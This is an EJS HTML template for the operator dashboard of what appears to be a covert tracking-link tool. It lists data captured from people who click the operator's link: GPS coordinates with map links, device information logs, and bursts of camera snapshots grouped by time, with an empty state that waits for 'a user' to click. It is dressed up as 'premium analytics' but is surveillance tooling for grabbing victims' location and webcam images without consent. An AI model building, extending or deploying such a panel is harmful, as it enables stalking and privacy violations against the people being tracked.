<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Analytics Dashboard | <%= userId %>
    </title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
</head>

<body>
    <div class="bg-mesh"></div>

    <div class="container">
        <header class="header" data-aos="fade-down">
            <h1>Analytics</h1>
            <p>Real-time insights for tracking ID: <span style="color: var(--accent); font-weight: 700;">
                    <%= userId %>
                </span></p>
            <div style="margin-top: 30px; display: flex; justify-content: center; gap: 20px;">
                <a href="/" class="btn btn-secondary" style="width: auto; padding: 12px 24px; font-size: 0.9rem;">
                    <i class="fas fa-arrow-left"></i> Home
                </a>
                <button onclick="location.reload()" class="btn btn-primary"
                    style="width: auto; padding: 12px 24px; font-size: 0.9rem;">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
            </div>
        </header>

        <% if (data && data.length> 0) { %>
            <div class="dashboard-grid">
                <!-- Stats Summary -->
                <div class="stat-card" data-aos="zoom-in" data-aos-delay="100">
                    <h4>Total Engagements</h4>
                    <div class="value">
                        <%= data.length %>
                    </div>
                </div>
                <div class="stat-card" data-aos="zoom-in" data-aos-delay="200">
                    <h4>Geo Captures</h4>
                    <div class="value">
                        <%= data.filter(e=> e.data && e.data.type === 'location').length %>
                    </div>
                </div>
                <div class="stat-card" data-aos="zoom-in" data-aos-delay="300">
                    <h4>System Logs</h4>
                    <div class="value">
                        <%= data.filter(e=> e.data && e.data.type === 'info').length %>
                    </div>
                </div>
                <div class="stat-card" data-aos="zoom-in" data-aos-delay="400">
                    <h4>Visual Snapshots</h4>
                    <div class="value">
                        <% let snapCount=0; data.forEach(e=> {
                            if(e.data && e.data.type === 'camsnap') snapCount++;
                            });
                            %>
                            <%= snapCount %>
                    </div>
                </div>

                <!-- Main Activity Feed -->
                <div class="data-table" data-aos="fade-up">
                    <div
                        style="padding: 25px 30px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
                        <h3 style="font-family: var(--font-heading); font-size: 1.5rem;">Activity Feed</h3>
                        <span style="color: var(--text-dim); font-size: 0.8rem;">
                            <%= data.length %> entries recorded
                        </span>
                    </div>

                    <% // Enhanced Grouping Logic for Snapshots const entries=[]; const groupedSnaps=new Map();
                        data.forEach(entry=> {
                        if (!entry || !entry.data) return; // Super defensive check

                        if (entry.data.type === 'camsnap') {
                        // Group snapshots taken within 10 seconds of each other
                        const time = new Date(entry.timestamp).getTime();
                        const roundedTime = Math.floor(time / 10000) * 10000;

                        if (!groupedSnaps.has(roundedTime)) {
                        groupedSnaps.set(roundedTime, {
                        timestamp: entry.timestamp,
                        type: 'camsnap_group',
                        images: []
                        });
                        }
                        groupedSnaps.get(roundedTime).images.push(entry.data);
                        } else {
                        entries.push(entry);
                        }
                        });

                        // Add grouped snapshots to main list
                        groupedSnaps.forEach(group => {
                        entries.push({
                        timestamp: group.timestamp,
                        data: {
                        type: 'camsnap_group',
                        images: group.images
                        }
                        });
                        });

                        // Sort final list by latest first
                        entries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                        %>

                        <% entries.forEach((entry, idx)=> { %>
                            <div class="table-row" data-aos="fade-up" data-aos-delay="<%= idx * 50 %>">
                                <div class="entry-meta">
                                    <div class="entry-time">
                                        <%= new Date(entry.timestamp).toLocaleTimeString([], {hour: '2-digit' ,
                                            minute:'2-digit', second:'2-digit'}) %>
                                            <br>
                                            <span style="font-size: 0.7rem; opacity: 0.6;">
                                                <%= new Date(entry.timestamp).toLocaleDateString() %>
                                            </span>
                                    </div>
                                    <span class="entry-type type-<%= (entry.data.type || '').replace('_group', '') %>">
                                        <%= (entry.data.type || 'unknown' ).replace('_group', '' ).toUpperCase() %>
                                    </span>
                                </div>

                                <div class="entry-content">
                                    <% if (entry.data.type==='location' ) { %>
                                        <div class="info-grid">
                                            <div class="info-item">
                                                <span>Coordinates</span>
                                                <p>
                                                    <%= entry.data.latitude %>, <%= entry.data.longitude %>
                                                </p>
                                            </div>
                                            <div class="info-item">
                                                <span>Accuracy</span>
                                                <p>Â± <%= entry.data.accuracy %>m</p>
                                            </div>
                                            <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
                                                target="_blank" class="info-item"
                                                style="text-decoration: none; border: 1px solid var(--accent);">
                                                <span style="color: var(--accent);">Interactive Map</span>
                                                <p style="color: var(--accent);">View Location <i
                                                        class="fas fa-external-link-alt" style="font-size: 0.8rem;"></i>
                                                </p>
                                            </a>
                                        </div>

                                        <% } else if (entry.data.type==='info' ) { %>
                                            <div class="info-grid">
                                                <% const parts=entry.data.content.split('<br>');
                                                    parts.forEach(part => {
                                                    const match = part.match(/<b>(.+?):<\ /b>\s*(.*)/);
                                                            if (match) {
                                                            %>
                                                            <div class="info-item">
                                                                <span>
                                                                    <%= match[1] %>
                                                                </span>
                                                                <p>
                                                                    <%= match[2] || 'N/A' %>
                                                                </p>
                                                            </div>
                                                            <% } }); %>
                                            </div>

                                            <% } else if (entry.data.type==='camsnap_group' ) { %>
                                                <div class="snapshot-grid">
                                                    <% entry.data.images.forEach(img=> { %>
                                                        <div class="snapshot-card"
                                                            onclick="window.open('/data/<%= img.filename %>', '_blank')">
                                                            <img src="/data/<%= img.filename %>" alt="Snapshot">
                                                        </div>
                                                        <% }) %>
                                                </div>
                                                <p style="margin-top: 10px; font-size: 0.8rem; color: var(--text-dim);">
                                                    Captured <%= entry.data.images.length %> burst snapshots
                                                </p>
                                                <% } %>
                                </div>
                            </div>
                            <% }) %>
                </div>
            </div>

            <% } else { %>
                <!-- Empty State -->
                <div class="card" style="text-align: center; padding: 100px 40px;" data-aos="zoom-in">
                    <i class="fas fa-radar fa-5x" style="color: var(--accent); opacity: 0.2; margin-bottom: 30px;"></i>
                    <h3 style="font-family: var(--font-heading); font-size: 2rem; margin-bottom: 20px;">No Signal
                        Detected</h3>
                    <p style="color: var(--text-dim);">We are standing by for incoming data. Once a user clicks your
                        tracking link, the analytics will populate automatically here.</p>
                    <div style="margin-top: 40px;">
                        <div
                            style="display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--accent); font-weight: 600;">
                            <span class="spinner"
                                style="border-width: 2px; width: 15px; height: 15px; margin-left: 0;"></span>
                            Monitoring Connection...
                        </div>
                    </div>
                </div>
                <% } %>

                    <footer style="margin-top: 80px; text-align: center; color: var(--text-dim); font-size: 0.8rem;">
                        &copy; 2024 ANTI-GRAVITY SYSTEM | PREMIUM ANALYTICS ENGINE
                    </footer>
    </div>

    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init({
            duration: 800,
            once: true,
            offset: 50
        });

        // Auto Refresh
        setInterval(() => {
            // Only refresh if no data yet to catch the first hit, 
            // or every 30 seconds for active dashboard
            location.reload();
        }, 30000);
    </script>
</body>

</html>